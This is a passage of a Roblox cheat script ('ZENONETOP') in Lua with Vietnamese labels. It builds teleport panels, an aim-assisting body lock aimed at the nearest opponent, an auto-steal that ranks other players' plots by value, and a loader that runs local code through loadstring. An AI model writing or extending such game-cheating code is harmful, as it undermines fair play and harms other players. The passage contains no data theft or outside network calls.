	title.Font = Enum.Font.GothamBold
	title.TextSize = 14
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = f
	local close = Instance.new("TextButton")
	close.Size = UDim2.new(0, 28, 0, 28)
	close.Position = UDim2.new(1, -34, 0, 6)
	close.BackgroundColor3 = Color3.fromRGB(40, 30, 50)
	close.Text = "X"
	close.TextColor3 = Color3.new(1, 1, 1)
	close.Font = Enum.Font.GothamBold
	close.Parent = f
	Instance.new("UICorner", close).CornerRadius = UDim.new(0, 6)
	close.MouseButton1Click:Connect(function() gui:Destroy() end)
	local lockB = Instance.new("TextButton")
	lockB.Size = UDim2.new(0, 64, 0, 24)
	lockB.Position = UDim2.new(1, -100, 0, 8)
	lockB.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
	lockB.Text = "UNLOCK"
	lockB.TextColor3 = Color3.new(1,1,1)
	lockB.Font = Enum.Font.GothamBold
	lockB.TextSize = 10
	lockB.Parent = f
	Instance.new("UICorner", lockB).CornerRadius = UDim.new(0, 6)
	lockB.MouseButton1Click:Connect(function()
 panelLocked = not panelLocked
 lockB.Text = panelLocked and "LOCK" or "UNLOCK"
 lockB.BackgroundColor3 = panelLocked and Color3.fromRGB(180, 60, 80) or Color3.fromRGB(40, 40, 55)
	end)
	-- restore pos
	if St._panelTPPos then
 f.Position = UDim2.new(St._panelTPPos[1], St._panelTPPos[2], St._panelTPPos[3], St._panelTPPos[4])
	end

	local function mkBtn(text, y, col, cb)
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(1, -24, 0, 32)
 b.Position = UDim2.new(0, 12, 0, y)
 b.BackgroundColor3 = col or Color3.fromRGB(50, 50, 70)
 b.Text = text
 b.TextColor3 = Color3.new(1, 1, 1)
 b.Font = Enum.Font.GothamBold
 b.TextSize = 12
 b.Parent = f
 Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
 b.MouseButton1Click:Connect(cb)
 return b
	end
	mkBtn("Luu Base (diem 1)", 44, Color3.fromRGB(180, 80, 140), function()
 local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not hrp then return end
 TP.base = hrp.Position
 if TP.markers.base then TP.markers.base:Destroy() end
 TP.markers.base = tpMarker(TP.base, Color3.fromRGB(255, 105, 180))
 showToast("BASE SAVED")
 if _G.ZenonetopRefreshTPBtn then _G.ZenonetopRefreshTPBtn() end
	end)
	mkBtn("Luu Pet (diem 2)", 84, Color3.fromRGB(200, 120, 40), function()
 local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not hrp then return end
 TP.pet = hrp.Position
 if TP.markers.pet then TP.markers.pet:Destroy() end
 TP.markers.pet = tpMarker(TP.pet, Color3.fromRGB(255, 140, 0))
 showToast("PET SAVED")
 if _G.ZenonetopRefreshTPBtn then _G.ZenonetopRefreshTPBtn() end
	end)
	mkBtn("Xoa diem", 124, Color3.fromRGB(80, 40, 40), function()
 TP.base, TP.pet = nil, nil
 if TP.markers.base then TP.markers.base:Destroy() end
 if TP.markers.pet then TP.markers.pet:Destroy() end
 TP.markers = {}
 showToast("CLEARED")
 if _G.ZenonetopRefreshTPBtn then _G.ZenonetopRefreshTPBtn() end
	end)
	mkBtn("TP NOW", 164, Color3.fromRGB(90, 70, 180), function()
 runPanelTP()
	end)
	-- delays
	local function delayRow(label, key, y)
 local t = Instance.new("TextLabel")
 t.Size = UDim2.new(0.5, 0, 0, 24)
 t.Position = UDim2.new(0, 12, 0, y)
 t.BackgroundTransparency = 1
 t.Text = label
 t.TextColor3 = Color3.fromRGB(200, 200, 210)
 t.TextSize = 11
 t.Font = Enum.Font.Gotham
 t.TextXAlignment = Enum.TextXAlignment.Left
 t.Parent = f
 local val = Instance.new("TextLabel")
 val.Size = UDim2.new(0, 50, 0, 24)
 val.Position = UDim2.new(1, -100, 0, y)
 val.BackgroundTransparency = 1
 val.Text = string.format("%.2f", TP[key])
 val.TextColor3 = Color3.new(1, 1, 1)
 val.Font = Enum.Font.GothamBold
 val.TextSize = 12
 val.Parent = f
 for i, sign in ipairs({ "-", "+" }) do
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 24, 0, 24)
 b.Position = UDim2.new(1, -40 + (i - 1) * 28 - 28, 0, y)
 b.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
 b.Text = sign
 b.TextColor3 = Color3.new(1, 1, 1)
 b.Font = Enum.Font.GothamBold
 b.Parent = f
 Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
 b.MouseButton1Click:Connect(function()
 TP[key] = math.clamp(TP[key] + (sign == "+" and 0.01 or -0.01), 0.01, 0.5)
 val.Text = string.format("%.2f", TP[key])
 end)
 end
	end
	delayRow("Delay Base", "delayBase", 210)
	delayRow("Delay Pet", "delayPet", 240)
	-- keybind
	local keyBtn = mkBtn("PHIM TP: [" .. tostring(TP.key):gsub("Enum.KeyCode.", "") .. "]", 270, Color3.fromRGB(40, 40, 55), function() end)
	keyBtn.MouseButton1Click:Connect(function()
 keyBtn.Text = "Nhan phim..."
 local conn
 conn = UIS.InputBegan:Connect(function(input, gp)
 if gp or input.UserInputType ~= Enum.UserInputType.Keyboard then return end
 TP.key = input.KeyCode
 keyBtn.Text = "PHIM TP: [" .. input.KeyCode.Name .. "]"
 conn:Disconnect()
 end)
	end)
end

-- Center TP button when 2 points saved
do
	local tpg = Instance.new("ScreenGui")
	tpg.Name = "ZenonetopCenterTP"
	tpg.ResetOnSpawn = false
	tpg.IgnoreGuiInset = true
	tpg.DisplayOrder = 1002
	tpg.Parent = PlayerGui
	local btn = Instance.new("TextButton")
	btn.Name = "CenterTP"
	btn.Size = UDim2.new(0, 160, 0, 40)
	btn.Position = UDim2.new(0.5, -80, 1, -120)
	btn.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
	btn.Text = "TP"
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.Font = Enum.Font.GothamBlack
	btn.TextSize = 14
	btn.Visible = false
	btn.Parent = tpg
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
	local bst = Instance.new("UIStroke", btn)
	bst.Color = Color3.fromRGB(140, 100, 255)
	btn.MouseButton1Click:Connect(runPanelTP)
	function _G.ZenonetopRefreshTPBtn()
 local has = TP.base ~= nil or TP.pet ~= nil
 btn.Visible = has
 local kn = tostring(TP.key):gsub("Enum.KeyCode.", "")
 if TP.base and TP.pet then
 btn.Text = "TP [" .. kn .. "]"
 elseif TP.base or TP.pet then
 btn.Text = "TP 1pt [" .. kn .. "]"
 else
 btn.Visible = false
 end
	end
end

UIS.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == TP.key then
 runPanelTP()
	end
end)


----------------------------------------------------------------
-- BODY LOCK (full ZENONETOP Clean / BloodHounds)
----------------------------------------------------------------
local bodyLockEnabled = false
local bodyLockRange = 20
local _bodyLockConn = nil
local _blSuppressCount = 0

function bodyLockCombatActive()
	return (_G.AceNormalAimbotOn == true)
 or (_G.AceAntiBypassAimbotOn == true)
 or (_G.AceAntiDesyncAimbotOn == true)
 or (St and St.toolAim == true and _G._VisToolAimActive == true)
end

function getClosestTargetBody()
	local char = LP.Character
	if not char then return nil end
	local root = char:FindFirstChild("HumanoidRootPart")
	if not root then return nil end
	local closest, minDist = nil, math.huge
	for _, plr in ipairs(Players:GetPlayers()) do
 if plr ~= LP and plr.Character then
 local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
 local hum = plr.Character:FindFirstChildOfClass("Humanoid")
 if tRoot and hum and hum.Health > 0 then
 local dist = (tRoot.Position - root.Position).Magnitude
 if dist < minDist then
 minDist = dist
 closest = tRoot
 end
 end
 end
	end
	return closest
end

-- Clean / BloodHounds body lock tick (predict + angular velocity)
function _bodyLockTick()
	local char = LP.Character
	if not char then return end
	local root = char:FindFirstChild("HumanoidRootPart")
	if not root then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	local target = getClosestTargetBody()
	if not target then
 if not hum.AutoRotate then hum.AutoRotate = true end
 return
	end
	local range = tonumber(bodyLockRange) or (type(St)=="table" and tonumber(St.bodyLockRange)) or 20
	local dist = (target.Position - root.Position).Magnitude
	if dist > range then
 if not hum.AutoRotate then hum.AutoRotate = true end
 return
	end
	if hum.AutoRotate then hum.AutoRotate = false end
	local targetVel = target.AssemblyLinearVelocity
	local speed3 = targetVel.Magnitude
	local predictTime = math.clamp(speed3 / 80, 0.08, 0.35)
	local predictedPos = target.Position + targetVel * predictTime
	local targetHead = target.Parent and target.Parent:FindFirstChild("Head")
	local targetHeight = targetHead and targetHead.Position.Y or target.Position.Y
	local myHeight = root.Position.Y + (hum.HipHeight or 0)
	local heightDiff = targetHeight - myHeight
	local verticalCorrection = math.clamp(heightDiff * 0.15, -1.5, 1.5)
	local flatTarget = Vector3.new(predictedPos.X, root.Position.Y + verticalCorrection, predictedPos.Z)
	local toPredict = flatTarget - root.Position
	if toPredict.Magnitude > 0.1 then
 local goalCF = CFrame.lookAt(root.Position, flatTarget)
 local diffCF = root.CFrame:Inverse() * goalCF
 local _, ry, _ = diffCF:ToEulerAnglesXYZ()
 ry = math.clamp(ry, -2.5, 2.5)
 root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(0, ry * 42, 0))
	end
end

function startBodyLock()
	if _bodyLockConn then
 pcall(function() _bodyLockConn:Disconnect() end)
 _bodyLockConn = nil
	end
	bodyLockEnabled = true
	if type(St) == "table" then St.bodyLock = true end
	local RS_ = RS or RunService or game:GetService("RunService")
	_bodyLockConn = RS_.RenderStepped:Connect(function()
 if not bodyLockEnabled then return end
 if (_blSuppressCount or 0) > 0 then return end
 _bodyLockTick()
	end)
end

function stopBodyLock()
	if _bodyLockConn then
 pcall(function() _bodyLockConn:Disconnect() end)
 _bodyLockConn = nil
	end
	bodyLockEnabled = false
	if type(St) == "table" then St.bodyLock = false end
	local c = LP.Character
	local root = c and c:FindFirstChild("HumanoidRootPart")
	if root then
 root.AssemblyAngularVelocity = Vector3.zero
 root.AssemblyLinearVelocity = Vector3.new(root.AssemblyLinearVelocity.X, -0.1, root.AssemblyLinearVelocity.Z)
	end
	local hum2 = c and c:FindFirstChildOfClass("Humanoid")
	if hum2 then hum2.AutoRotate = true end
end

-- Clean suppress (auto left/right / bat can pause lock)
function _suppressBodyLock()
	_blSuppressCount = (_blSuppressCount or 0) + 1
	if _blSuppressCount == 1 and bodyLockEnabled then
 _blWasEnabled = true
 -- only disconnect loop, keep bodyLockEnabled true for restore
 if _bodyLockConn then
 pcall(function() _bodyLockConn:Disconnect() end)
 _bodyLockConn = nil
 end
 if bodyLockSetVisual then pcall(bodyLockSetVisual, false) end
 if _blRestoreTimer then
 pcall(task.cancel, _blRestoreTimer)
 _blRestoreTimer = nil
 end
 _blSmoothRestore = false
	end
end

function _unsuppressBodyLock(delayed)
	if (_blSuppressCount or 0) > 0 then
 _blSuppressCount = _blSuppressCount - 1
	end
	if _blSuppressCount == 0 and _blWasEnabled then
 _blWasEnabled = false
 local function restore()
 if bodyLockEnabled then
 _blSmoothRestore = true
 startBodyLock()
 if bodyLockSetVisual then pcall(bodyLockSetVisual, true) end
 task.delay(0.5, function() _blSmoothRestore = false end)
 end
 _blRestoreTimer = nil
 end
 if delayed then
 _blRestoreTimer = task.delay(1, restore)
 else
 restore()
 end
	end
end

function setBodyLock(on)
	if on then startBodyLock() else stopBodyLock() end
	pcall(function() if saveCfg then saveCfg() end end)
end

-- sync range from config when set
function setBodyLockRange(v)
	v = math.clamp(tonumber(v) or 20, 5, 100)
	bodyLockRange = v
	St.bodyLockRange = v
	saveCfg()
end


----------------------------------------------------------------
-- UI: Panel tab + Auto Steal + InfJump mode on existing pages
----------------------------------------------------------------
task.defer(function()
	-- Auto steal on Player page
	if not pagePlayer then warn("[ZENONETOP] pagePlayer nil") return end
	section(pagePlayer, "* — AUTO STEAL", 20)
	local function safeSetAS(on)
 if type(setAutoSteal) == "function" then
 setAutoSteal(on)
 else
 St.autoSteal = on and true or false
 end
	end
	toggleNamed(pagePlayer, "Auto Steal", St.autoSteal == true, safeSetAS, 21, "autoSteal")
	-- ver modes
	local verRow = row(pagePlayer, 36, 22)
	local vl = Instance.new("TextLabel")
	vl.Size = UDim2.new(0.35, 0, 1, 0)
	vl.Position = UDim2.new(0, 10, 0, 0)
	vl.BackgroundTransparency = 1
	vl.Text = "Version"
	vl.TextColor3 = C.text
	vl.TextSize = 12
	vl.Font = Enum.Font.Gotham
	vl.TextXAlignment = Enum.TextXAlignment.Left
	vl.Parent = verRow
	for i, name in ipairs({"V1", "V2", "V3"}) do
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 40, 0, 26)
 b.Position = UDim2.new(1, -140 + (i - 1) * 44, 0.5, -13)
 b.BackgroundColor3 = (St.stealVer == name) and C.accent or C.box
 b.Text = name
 b.TextColor3 = (St.stealVer == name) and Color3.fromRGB(30, 20, 30) or C.text
 b.TextSize = 11
 b.Font = Enum.Font.GothamBold
 b.AutoButtonColor = false
 b.Active = true
 b.ZIndex = 40
 b.Parent = verRow
 Instance.new("UICorner", b).CornerRadius = UDim.new(0, 7)
 local function pickVer()
 St.stealVer = name
 for _, ch in ipairs(verRow:GetChildren()) do
 if ch:IsA("TextButton") then
 local on = ch.Text == St.stealVer
 ch.BackgroundColor3 = on and C.accent or C.box
 ch.TextColor3 = on and Color3.fromRGB(30, 20, 30) or C.text
 end
 end
 -- apply mode immediately (fix non-responsive V1/V2/V3)
 selectedStealMode = (name == "V1") and "Normal" or "Semi"
 if name == "V2" then autoStealV2Version = "V1" end
 if name == "V3" then autoStealV2Version = "V2" end
 if name == "V1" then selectedStealMode = "Normal" end
 autoStealRadius = tonumber(St.stealRadius) or 60
 if type(setAutoSteal) == "function" and St.autoSteal then
 pcall(function() setAutoSteal(true) end)
 elseif _G.ZenonetopSyncAutoSteal then
 pcall(_G.ZenonetopSyncAutoSteal)
 end
 pcall(saveCfg)
 end
 b.MouseButton1Click:Connect(pickVer)
 b.Activated:Connect(pickVer)
	end
	toggleNamed(pagePlayer, "Pause (chi khi ON)", St.stealPause == true, function(on)
 St.stealPause = on and true or false
 _G.ZenonetopStealPause = St.stealPause
 if _G.ZenonetopSyncAutoSteal then pcall(_G.ZenonetopSyncAutoSteal) end
 saveCfg()
	end, 23, "stealPause")
	-- radius box
	local rr = row(pagePlayer, 36, 24)
	local rl = Instance.new("TextLabel")
	rl.Size = UDim2.new(0.5, 0, 1, 0)
	rl.Position = UDim2.new(0, 10, 0, 0)
	rl.BackgroundTransparency = 1
	rl.Text = "Steal Radius"
	rl.TextColor3 = C.text
	rl.TextSize = 12
	rl.Font = Enum.Font.Gotham
	rl.TextXAlignment = Enum.TextXAlignment.Left
	rl.Parent = rr
	numBox(rr, UDim2.new(1, -70, 0.5, -12), 56, St.stealRadius, function(v)
 St.stealRadius = v
 saveCfg()
	end)
	-- force scroll size so AUTO STEAL is visible
	pcall(function()
 local lay = pagePlayer:FindFirstChildOfClass("UIListLayout")
 if lay then
 pagePlayer.CanvasSize = UDim2.new(0, 0, 0, lay.AbsoluteContentSize.Y + 40)
 end
	end)

	-- InfJump mode row near inf jump if exists
	section(pagePlayer, "* — INF JUMP MODE", 217)
	local ij = row(pagePlayer, 36, 218)
	for i, name in ipairs({"hold", "manual"}) do
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 70, 0, 26)
 b.Position = UDim2.new(0, 12 + (i - 1) * 80, 0.5, -13)
 b.BackgroundColor3 = (St.infJumpMode == name) and C.accent or C.box
 b.Text = name
 b.TextColor3 = (St.infJumpMode == name) and Color3.fromRGB(30, 20, 30) or C.text
 b.TextSize = 11
 b.Font = Enum.Font.GothamBold
 b.Parent = ij
 Instance.new("UICorner", b).CornerRadius = UDim.new(0, 7)
 b.MouseButton1Click:Connect(function()
 setInfJumpMode(name)
 for _, ch in ipairs(ij:GetChildren()) do
 if ch:IsA("TextButton") then
 local on = ch.Text == St.infJumpMode
 ch.BackgroundColor3 = on and C.accent or C.box
 ch.TextColor3 = on and Color3.fromRGB(30, 20, 30) or C.text
 end
 end
 end)
	end

	setTab("Panel")
end)

print("[ZENONETOP Ext] Panel TP | AutoSteal V1/V2 + bar | InfJump hold/manual | ToolAim ON")



-- ============================================================
-- TP TO BEST (Chilli style) — equip carpet + TP best brainrot
-- ============================================================
function parseGenValue(text)
	if not text then return 0 end
	text = tostring(text):gsub(",", ""):gsub("%s", ""):upper()
	-- $5M/s $1.2B 850M 7M/S 14.8B
	local best = 0
	for num, suffix in text:gmatch("([%d%.]+)([KMBTQA]?)") do
 local n = tonumber(num)
 if n then
 local mul = 1
 if suffix == "K" then mul = 1e3
 elseif suffix == "M" then mul = 1e6
 elseif suffix == "B" then mul = 1e9
 elseif suffix == "T" then mul = 1e12
 elseif suffix == "Q" or suffix == "QA" then mul = 1e15
 end
 local v = n * mul
 if v > best then best = v end
 end
	end
	return best
end

function isStealAction(prompt)
	if not prompt or not prompt:IsA("ProximityPrompt") then return false end
	local act = tostring(prompt.ActionText or ""):lower()
	local obj = tostring(prompt.ObjectText or ""):lower()
	-- EN + ES + VI (Steal)
	if act:find("steal") or act:find("robar") or act:find("steal") or act:find("steal")
 or act:find("grab") or act:find("take") then
 return true
	end
	if obj:find("steal") or obj:find("steal") or obj:find("steal") or obj:find("robar") then
 return true
	end
	-- unicode normalize fallback
	local actRaw = tostring(prompt.ActionText or "")
	if actRaw:find("uop") or actRaw:find("Steal") or actRaw:find("steal") then return true end
	return false
end

function isOwnPlot(plot)
	if not plot then return false end
	local sign = plot:FindFirstChild("PlotSign") or plot:FindFirstChild("Sign")
	if sign then
 for _, d in ipairs(sign:GetDescendants()) do
 if d:IsA("BillboardGui") and (d.Name:lower():find("your") or d.Enabled) then
 if d.Name:lower():find("your") or d.Name:lower():find("base") then
 -- check owner attribute
 end
 end
 end
	end
	-- attribute / string value owner
	local ok, owner = pcall(function()
 return plot:GetAttribute("Owner") or plot:GetAttribute("OwnerId")
	end)
	if ok and owner and tostring(owner) == tostring(LP.UserId) then return true end
	local ok2, ownerName = pcall(function()
 return plot:GetAttribute("OwnerName")
	end)
	if ok2 and ownerName and tostring(ownerName) == LP.Name then return true end
	-- YourBase billboard
	for _, d in ipairs(plot:GetDescendants()) do
 if d:IsA("BillboardGui") and d.Name == "YourBase" and d.Enabled then
 return true
 end
	end
	return false
end

function findBestBrainrot()
	local roots = {}
	for _, name in ipairs({"Plots", "plots", "Bases", "Animals", "Pets", "Map"}) do
 local f = workspace:FindFirstChild(name)
 if f then table.insert(roots, f) end
	end
	if #roots == 0 then table.insert(roots, workspace) end

	local bestPrompt, bestVal, bestPart = nil, -1, nil
	local function consider(d)
 if not d:IsA("ProximityPrompt") then return end
 if not isStealAction(d) then return end
 if d.Enabled == false then return end
 -- skip own character
 if LP.Character and d:IsDescendantOf(LP.Character) then return end
 local part = d.Parent
 if not part then return end
 -- climb out of own plot
 local plot = d
 for _ = 1, 8 do
 if not plot.Parent or plot.Parent == workspace then break end
 plot = plot.Parent
 if isOwnPlot(plot) then return end
 end
 local basePart = part:IsA("BasePart") and part
 or (part:IsA("Model") and part:FindFirstChildWhichIsA("BasePart", true))
 or part:FindFirstAncestorWhichIsA("BasePart")
 if not basePart then return end
 local val = 0
 local searchRoot = part:IsA("Model") and part or part.Parent
 if searchRoot then
 for _, lab in ipairs(searchRoot:GetDescendants()) do
 if lab:IsA("TextLabel") or lab:IsA("TextButton") then
 local t = lab.Text or ""
 if t:find("%$") or t:find("/s") or t:find("/S") or t:upper():find("[KMBT]") then
 local v = parseGenValue(t)
 if v > val then val = v end
 end
 end
 end
 end
 local v2 = parseGenValue(d.ObjectText)
 if v2 > val then val = v2 end
 -- BillboardGui near prompt
 for _, bb in ipairs(workspace:GetDescendants()) do
 if bb:IsA("BillboardGui") and bb.Adornee then
 local okd, dist = pcall(function()
 return (bb.Adornee.Position - basePart.Position).Magnitude
 end)
 if okd and dist and dist < 12 then
 for _, lab in ipairs(bb:GetDescendants()) do
 if lab:IsA("TextLabel") then
 local v = parseGenValue(lab.Text)
 if v > val then val = v end
 end
 end
 end
 end
 end
 if val > bestVal or (val == bestVal and bestVal < 0) then
 bestVal = val
 bestPrompt = d
 bestPart = basePart
 elseif bestPrompt == nil then
 bestVal = val
 bestPrompt = d
 bestPart = basePart
 end
	end

	for _, root in ipairs(roots) do
 if root == workspace then
 -- limit scan
 for _, d in ipairs(workspace:GetDescendants()) do
 if d:IsA("ProximityPrompt") then consider(d) end
 end
 else
 for _, plot in ipairs(root:GetChildren()) do
 if not isOwnPlot(plot) then
 for _, d in ipairs(plot:GetDescendants()) do
 consider(d)
 end
 end
 end
 end
	end
	return bestPart, bestVal, bestPrompt
end

function equipFlyingCarpet(char)
	char = char or LP.Character
	if not char then return false end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return false end
	local names = {
 "Flying Carpet", "Carpet", "Cloud", "Witch's Broom",
 "Magic Carpet", "Fly Carpet", "FlyingCarpet",
	}
	for _, n in ipairs(names) do
 local g = char:FindFirstChild(n) or LP.Backpack:FindFirstChild(n)
 if g and g:IsA("Tool") then
 pcall(function() hum:EquipTool(g) end)
 return true
 end
	end
	-- fuzzy
	for _, t in ipairs(LP.Backpack:GetChildren()) do
 if t:IsA("Tool") then
 local ln = t.Name:lower()
 if ln:find("carpet") or ln:find("broom") or ln:find("cloud") or ln:find("fly") then
 pcall(function() hum:EquipTool(t) end)
 return true
 end
 end
	end
	for _, t in ipairs(char:GetChildren()) do
 if t:IsA("Tool") then
 local ln = t.Name:lower()
 if ln:find("carpet") or ln:find("broom") or ln:find("cloud") then
 return true
 end
 end
	end
	return false
end

local tpBestBusy = false
function tpToBestChilli()
	-- removed per request
end
_G.ZenonetopTpToBest = tpToBestChilli

-- UI: button on Panel + mobile + keybind
St.keys.TpBest = St.keys.TpBest or Enum.KeyCode.B

task.defer(function()
	local pagePanel = pages and pages["Panel"]
	if pagePanel then
 section(pagePanel, "* — PANEL TP", 10)
 -- TP BEST removed
	-- actionBtn panel removed
 local info = row(pagePanel, 44, 12)
 local t = Instance.new("TextLabel")
 t.Size = UDim2.new(1, -10, 1, 0)
 t.Position = UDim2.new(0, 6, 0, 0)
 t.BackgroundTransparency = 1
 t.Text = "Infinite Jump Hold/Manual — BloodHounds"
 t.TextColor3 = C.textDim
 t.TextSize = 10
 t.Font = Enum.Font.Gotham
 t.TextXAlignment = Enum.TextXAlignment.Left
 t.Parent = info
	end
	-- also on Player for easy test
	if pagePlayer then
 section(pagePlayer, "* — INFINITE JUMP", 40)
 -- TP BEST removed
	end
end)

-- Mobile external button
task.defer(function()
	local g = Instance.new("ScreenGui")
	g.Name = "ZenonetopTpBestBtn"
	g.Enabled = false -- removed TP BEST
	g.ResetOnSpawn = false
	g.IgnoreGuiInset = true
	g.DisplayOrder = 1003
	g.Parent = PlayerGui
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 110, 0, 36)
	b.Position = UDim2.new(0.5, -55, 0, 12)
	b.BackgroundColor3 = Color3.fromRGB(20, 40, 30)
	b.Text = "INF JUMP"
	b.TextColor3 = Color3.fromRGB(120, 255, 160)
	b.Font = Enum.Font.GothamBlack
	b.TextSize = 13
	b.Parent = g
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 10)
	local s = Instance.new("UIStroke", b)
	s.Color = Color3.fromRGB(80, 220, 120)
	s.Thickness = 1.5
	b.MouseButton1Click:Connect(tpToBestChilli)
	-- drag
	do
 local dragging, dragStart, startPos, moved
 b.InputBegan:Connect(function(input)
 if St.guiLock then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 moved = false
 dragStart = input.Position
 startPos = b.Position
 input.Changed:Connect(function()
 if input.UserInputState == Enum.UserInputState.End then dragging = false end
 end)
 end
 end)
 UIS.InputChanged:Connect(function(input)
 if not dragging or St.guiLock then return end
 if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
 local d = input.Position - dragStart
 if math.abs(d.X) > 4 or math.abs(d.Y) > 4 then moved = true end
 if moved then
 b.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
 end
 end)
	end
end)

-- TP Best keybind removed



----------------------------------------------------------------
-- OVERHEAD: real speed + discord (from ZENONETOP)
----------------------------------------------------------------
local overheadGui, overheadSpeedLabel
function setupOverheadInfo(char)
	char = char or LP.Character
	if not char then return end
	local head = char:FindFirstChild("Head") or char:WaitForChild("Head", 5)
	if not head then
 -- fallback HRP
 head = char:FindFirstChild("HumanoidRootPart")
 if not head then return end
	end
	pcall(function()
 local old = head:FindFirstChild("ZenonetopOverheadInfo")
 if old then old:Destroy() end
	end)
	if overheadGui then pcall(function() overheadGui:Destroy() end) end
	overheadGui = Instance.new("BillboardGui")
	overheadGui.Name = "ZenonetopOverheadInfo"
	overheadGui.Size = UDim2.new(0, 300, 0, 96)
	overheadGui.StudsOffset = Vector3.new(0, 2.8, 0)
	overheadGui.AlwaysOnTop = true
	overheadGui.MaxDistance = 200
	overheadGui.LightInfluence = 0
	overheadGui.Adornee = head
	overheadGui.Parent = head
	local titleLbl = Instance.new("TextLabel")
	titleLbl.Size = UDim2.new(1, 0, 0, 22)
	titleLbl.Position = UDim2.new(0, 0, 0, 0)
	titleLbl.BackgroundTransparency = 1
	titleLbl.Text = "Free Sell La Tuat Ngu Lon"
	titleLbl.TextColor3 = Color3.fromRGB(255, 220, 100)
	titleLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	titleLbl.TextStrokeTransparency = 0
	titleLbl.Font = Enum.Font.Bangers
	titleLbl.TextSize = 17
	titleLbl.Parent = overheadGui
	local discordLbl = Instance.new("TextLabel")
	discordLbl.Size = UDim2.new(1, 0, 0, 20)
	discordLbl.Position = UDim2.new(0, 0, 0, 22)
	discordLbl.BackgroundTransparency = 1
	discordLbl.Text = ""
	discordLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
	discordLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	discordLbl.TextStrokeTransparency = 0
	discordLbl.Font = Enum.Font.Bangers
	discordLbl.TextSize = 16
	discordLbl.Parent = overheadGui
	overheadSpeedLabel = Instance.new("TextLabel")
	overheadSpeedLabel.Size = UDim2.new(1, 0, 0, 22)
	overheadSpeedLabel.Position = UDim2.new(0, 0, 0, 44)
	overheadSpeedLabel.BackgroundTransparency = 1
	overheadSpeedLabel.Text = "Speed: 0.0"
	overheadSpeedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	overheadSpeedLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	overheadSpeedLabel.TextStrokeTransparency = 0
	overheadSpeedLabel.Font = Enum.Font.Bangers
	overheadSpeedLabel.TextSize = 18
	overheadSpeedLabel.Parent = overheadGui
end
if not _G._VisOverheadLoop then
	_G._VisOverheadLoop = true
	LP.CharacterAdded:Connect(function(ch)
 task.wait(0.5)
 setupOverheadInfo(ch)
	end)
	if LP.Character then task.defer(function() setupOverheadInfo(LP.Character) end) end
	RS.RenderStepped:Connect(function()
 if not overheadSpeedLabel then return end
 local char = LP.Character
 local root = char and char:FindFirstChild("HumanoidRootPart")
 if not root then return end
 local v = root.AssemblyLinearVelocity
 local actual = Vector3.new(v.X, 0, v.Z).Magnitude
 local target = 0
 pcall(function() target = getActiveMoveSpeed() end)
 if St.speedOn and target > 0 then
 overheadSpeedLabel.Text = string.format("Speed: %.0f (%.0f)", target, actual)
 else
 overheadSpeedLabel.Text = string.format("Speed: %.1f", actual)
 end
	end)
end


print("[ZENONETOP] TP TO BEST (Chilli) ready | key B | nut TP BEST")



-- ============================================================
-- LOAD FULL VIS AUTO STEAL (V1 / Semi V1-V2 / V3)
-- ============================================================
_G.ZenonetopStealPause = (St.stealPause == true)
task.spawn(function()
	local src
	pcall(function()
 if readfile and isfile and isfile("Zenonetop_Auto_Steal_Embedded.lua") then
 src = readfile("Zenonetop_Auto_Steal_Embedded.lua")
 end
	end)
	-- fallback: try workspace artifact path won't work in-game; embed minimal wire
	if not src then
 -- Use already-defined setAutoSteal in this file; boost by calling Vis setups if present
 warn("[Vis] AutoSteal embed not found via readfile — using internal + global hooks")
	else
 local fn, err = loadstring(src)
 if fn then
 pcall(fn)
 print("[Vis] AutoSteal full loaded")
 else
 warn("[Vis] AutoSteal load err", err)
 end
	end
	-- Wire toggles to Ace sync
	local function syncSteal()
 _G.ZenonetopStealPause = (St.stealPause == true)
 autoStealEnabled = St.autoSteal == true
 _G.autoStealEnabled = autoStealEnabled
 if St.stealVer == "V1" then
 selectedStealMode = "Normal"
 elseif St.stealVer == "V2" then
 selectedStealMode = "Semi"
 autoStealV2Version = "V1"
 elseif St.stealVer == "V3" then
 selectedStealMode = "Semi"
 autoStealV2Version = "V2"
 end
 autoStealRadius = tonumber(St.stealRadius) or 60
 autoStealV1PausePercent = tonumber(St.stealPausePct) or 75
 if _G.__AceSetupNormalAutoSteal then pcall(_G.__AceSetupNormalAutoSteal) end
 if _G.__AceSetupSemiAutoSteal then pcall(_G.__AceSetupSemiAutoSteal) end
 if autoStealEnabled then
 if selectedStealMode == "Normal" or selectedStealMode == "V1" then
 if _G.AceNormalAutoStealStart then pcall(_G.AceNormalAutoStealStart) end
 else
 if _G.AceSemiAutoStealStart then pcall(_G.AceSemiAutoStealStart) end
 end
 else
 if _G.AceNormalAutoStealStop then pcall(_G.AceNormalAutoStealStop) end
 if _G.AceSemiAutoStealStop then pcall(_G.AceSemiAutoStealStop) end
 end
 if _G.AceAutoStealSync then pcall(_G.AceAutoStealSync) end
	end
